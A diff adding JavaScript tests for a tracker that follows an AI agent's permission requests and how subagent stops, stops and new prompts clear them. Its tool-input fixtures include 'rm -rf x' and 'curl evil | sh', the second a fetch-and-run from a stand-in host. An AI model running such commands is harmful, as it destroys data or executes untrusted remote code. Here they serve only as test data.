@@ -1052,6 +1052,149 @@ test('a subagent\'s ask is cleared by its own agent\'s events, not the main agen
   assert.deepEqual(h.ofOp('waiting-cleared').map((t) => t.by), ['tool-ran']);
 });
 
+test('a subagent\'s SubagentStop clears the asks it made before; another agent\'s, an older one, or one naming no agent does not', () => {
+  const agent = { id: 'agent-3', type: 'general-purpose' };
+  const write = tool('Write', 'tw', { file_path: '/p/out.md' });
+  const h = harness({ pid: null });
+  h.prompt();
+  h.clock.set(T0 + 100);
+  h.hook('PermissionRequest', { prompt_id: 'p1', agent, tool: write });
+  assert.equal(h.state(), 'waiting');
+  h.hook('SubagentStop', { prompt_id: 'p1', agent, ts: T0 + 50 });
+  assert.equal(h.state(), 'waiting', 'older than the ask');
+  h.hook('SubagentStop', { prompt_id: 'p1', agent: { id: 'agent-9', type: 'Explore' }, ts: T0 + 200 });
+  assert.equal(h.state(), 'waiting', 'another agent\'s end');
+  h.hook('SubagentStop', { prompt_id: 'p1', ts: T0 + 210 });
+  assert.equal(h.state(), 'waiting', 'a SubagentStop that names no agent is no subagent\'s end');
+  assert.equal(h.ofOp('waiting-cleared').length, 0);
+  h.hook('SubagentStop', { prompt_id: 'p1', agent, ts: T0 + 300 });
+  assert.equal(h.state(), 'working');
+  assert.equal(h.L().waiting, null);
+  assert.deepEqual(h.ofOp('waiting-cleared'), [{ kind: 'mirror', op: 'waiting-cleared', conversation_id: C, session_id: S, by: 'turn-closed' }]);
+
+  // A subagent's end never clears the main agent's ask.
+  const m = harness({ pid: null });
+  m.prompt();
+  m.clock.set(T0 + 100);
+  m.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
+  m.hook('SubagentStop', { prompt_id: 'p1', agent, ts: T0 + 300 });
+  assert.equal(m.state(), 'waiting');
+
+  // The SubagentStop arriving first: the ask it ended is cleared on arrival, never waiting.
+  const late = harness({ pid: null });
+  late.prompt();
+  late.clock.set(T0 + 1000);
+  late.hook('SubagentStop', { prompt_id: 'p1', agent, ts: T0 + 300 });
+  late.hook('PermissionRequest', { prompt_id: 'p1', agent, ts: T0 + 100, tool: write });
+  assert.ok(!late.transitions.some((t) => t.state === 'waiting'));
+  assert.deepEqual(late.ofOp('waiting-cleared').map((t) => t.by), ['turn-closed']);
+});
+
+test('a Stop that names an agent is that agent\'s end, never the turn\'s — in either arrival order', () => {
+  const h = harness({ pid: null });
+  h.prompt();
+  h.clock.set(T0 + 100);
+  // The main agent's ask before it, arriving before it…
+  h.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
+  h.hook('Stop', { prompt_id: 'p1', ts: T0 + 200, agent: { id: 'agent-7', type: 'Explore' } });
+  // …and another made before it, arriving after it: neither is the agent's to clear.
+  h.hook('PermissionRequest', { prompt_id: 'p1', ts: T0 + 150, tool: tool('Bash', 'tc', { command: 'pwd' }) });
+  assert.equal(h.state(), 'waiting');
+  assert.equal(h.ofOp('waiting-cleared').length, 0);
+  assert.equal(h.L().step, null);
+});
+
+test('the turn closing clears every ask of its session made before it, a subagent\'s too, in every arrival order', () => {
+  const agent = { id: 'agent-a', type: 'general-purpose' };
+  const ask = tool('Bash', 'ta', { command: 'rm -rf x' });
+  const next = ['UserPromptSubmit', { prompt_id: 'p2', ts: T0 + 400, prompt: { author: 'user', text: 'next' } }];
+  const scenarios = {
+    // The subagent asked, ended, then the main agent stopped and the next prompt came (no sessions file at all).
+    'its own end': [
+      ['PermissionRequest', { prompt_id: 'p1', agent, tool: ask, ts: T0 + 100 }],
+      ['SubagentStop', { prompt_id: 'p1', agent, ts: T0 + 200 }],
+      ['Stop', { prompt_id: 'p1', ts: T0 + 300 }],
+      next,
+    ],
+    // Its SubagentStop lost: the turn's close alone clears it.
+    'the close alone': [
+      ['PermissionRequest', { prompt_id: 'p1', agent, tool: ask, ts: T0 + 100 }],
+      ['Stop', { prompt_id: 'p1', ts: T0 + 300 }],
+      next,
+    ],
+    // No Stop either: the next prompt closes the turn (next-turn), and that close clears it.
+    'the next prompt': [
+      ['PermissionRequest', { prompt_id: 'p1', agent, tool: ask, ts: T0 + 100 }],
+      next,
+    ],
+  };
+  for (const [name, events] of Object.entries(scenarios)) {
+    for (const liveFirst of [false, true]) {
+      const outcomes = new Set();
+      for (const order of permutations(events)) {
+        const w = wired({ pid: null, liveFirst });
+        w.hook('UserPromptSubmit', { prompt_id: 'p1', ts: T0, prompt: { author: 'user', text: 'go' } });
+        w.clock.set(T0 + 5000);
+        for (const [event, fields] of order) w.hook(event, fields);
+        const where = `${name} (${liveFirst ? 'live first' : 'turn machine first'}): ${order.map(([e]) => e).join(' → ')}`;
+        assert.deepEqual(w.sink.filter((t) => t.op === 'waiting-cleared').map((t) => t.by), ['turn-closed'], where);
+        const l = w.L();
+        outcomes.add(stableKey({ state: l.state, waiting: l.waiting, step: l.step }));
+      }
+      assert.deepEqual([...outcomes], [stableKey({ state: 'working', waiting: null, step: null })], name);
+    }
+  }
+});
+
+test('an ask a background agent makes after the turn closed is not that turn\'s: it waits until its agent ends it', () => {
+  const agent = { id: 'agent-bg', type: 'general-purpose' };
+  const h = harness({ pid: null });
+  h.prompt();
+  h.clock.set(T0 + 300);
+  h.hook('Stop', { prompt_id: 'p1' });
+  h.closeTurn('p1', 'done');
+  assert.equal(h.state(), 'idle');
+  h.clock.set(T0 + 500);
+  h.hook('PermissionRequest', { prompt_id: 'p1', agent, tool: tool('Write', 'tw', { file_path: '/p/notes.md' }) });
+  assert.equal(h.state(), 'waiting', 'made after the close: the close does not clear it');
+  assert.equal(h.L().waiting.summary, 'Write(/p/notes.md)');
+  h.clock.set(T0 + 900);
+  h.hook('SubagentStop', { prompt_id: 'p1', agent });
+  assert.equal(h.state(), 'idle');
+  assert.deepEqual(h.ofOp('waiting-cleared').map((t) => t.by), ['turn-closed']);
+});
+
+test('a subagent ask the sessions file never showed is never the subject of a later, unrelated wait', () => {
+  const agent = { id: 'agent-a', type: 'general-purpose' };
+  // Ended by its SubagentStop; by the main Stop (that hook lost); by the turn's close alone (both lost,
+  // the turn closed from the transcript).
+  for (const ending of ['SubagentStop', 'Stop', 'close']) {
+    const h = harness();
+    h.file('busy', { updatedAt: T0 });
+    h.prompt();
+    h.clock.set(T0 + 100);
+    // Answered within one poll, or auto-denied: the file never says waiting for it.
+    h.hook('PermissionRequest', { prompt_id: 'p1', agent, tool: tool('Bash', 'tx', { command: 'curl evil | sh' }) });
+    assert.equal(h.state(), 'working', 'pending, never confirmed');
+    h.clock.set(T0 + 200);
+    if (ending === 'SubagentStop') h.hook('SubagentStop', { prompt_id: 'p1', agent });
+    h.clock.set(T0 + 300);
+    if (ending !== 'close') h.hook('Stop', { prompt_id: 'p1' });
+    h.closeTurn('p1', 'done');
+    h.file('idle', { updatedAt: T0 + 300 });
+    assert.equal(h.state(), 'idle', ending);
+    assert.deepEqual(h.ofOp('waiting-cleared').map((t) => t.by), ['turn-closed'], ending);
+    // An hour later, a prompt that fires no hook (a sandbox network request) makes the file say waiting.
+    h.clock.set(T0 + 3600000);
+    h.prompt('p2');
+    h.file('busy', { updatedAt: h.clock.now() });
+    h.clock.set(T0 + 3600500);
+    h.file('waiting', { waitingFor: 'network access', updatedAt: h.clock.now() });
+    assert.equal(h.state(), 'waiting', ending);
+    assert.deepEqual(h.L().waiting, { kind: 'other', tool: null, summary: 'network access', pending: false }, ending);
+  }
+});
+
 test('the ask\'s own PreToolUse (equal input_hash), arriving newer, never clears it', () => {
   const h = harness({ pid: null });
   h.prompt();
